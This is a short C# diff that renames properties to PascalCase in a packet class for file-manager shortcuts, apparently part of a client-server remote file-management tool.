@@ -21,28 +21,28 @@ namespace PacketLib.Packet
         //server
         public ShortCutFileManagersPacket(ShortCuts shortCuts) : base()
         {
-            this.packetType = PacketType.FM_SHORTCUT_PATH;
+            this.PacketType = PacketType.FM_SHORTCUT_PATH;
             this.shortCuts = shortCuts;
         }
 
         //client
         public ShortCutFileManagersPacket(Dictionary<ushort, List<object[]>> filesAndDirs, string baseIp, string HWID) : base()
         {
-            packetType = PacketType.FM_SHORTCUT_PATH;
-            this.baseIp = baseIp;
+            PacketType = PacketType.FM_SHORTCUT_PATH;
+            this.BaseIp = baseIp;
             this.HWID = HWID;
 
             this.filesAndDirs = filesAndDirs;
         }
 
         public string HWID { get; set; }
-        public string baseIp { get; set; }
-        public byte[] plugin { get; set; }
-        public PacketType packetType { get; }
-        public PacketState packetState { get; set; }
-        public string status { get; set; }
-        public string datePacketStatus { get; set; }
-        public int packetSize { get; set; }
+        public string BaseIp { get; set; }
+        public byte[] Plugin { get; set; }
+        public PacketType PacketType { get; }
+        public PacketState PacketState { get; set; }
+        public string Status { get; set; }
+        public string DatePacketStatus { get; set; }
+        public int PacketSize { get; set; }
 
         public string path { get; set; }
         public ShortCuts shortCuts { get; set; }
